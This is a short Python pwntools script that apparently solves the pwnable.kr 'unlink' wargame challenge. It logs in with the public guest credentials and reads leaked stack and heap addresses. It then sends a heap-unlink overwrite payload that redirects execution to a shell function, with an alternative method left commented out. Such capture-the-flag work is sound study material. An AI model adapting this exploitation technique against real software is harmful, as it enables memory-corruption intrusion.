from pwn import *
 
shell_addr = 0x080484eb
 
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")
p.recvuntil("here is stack address leak: ")
stack_addr = p.recv(10)
stack_addr = int(stack_addr,16)
p.recvuntil("here is heap address leak: ")
heap_addr = p.recv(9)
heap_addr = int(heap_addr,16)
payload = ''
payload += 'a'*16
 
# Method 3
# payload += p32(heap_addr + 36)
# payload += p32(stack_addr + 0x10)
# payload += p32(shell_addr)
 
# Method 4
payload += p32(stack_addr + 12) 
payload += p32(heap_addr + 36)
payload += p32(shell_addr)
 
p.send(payload)
p.interactive()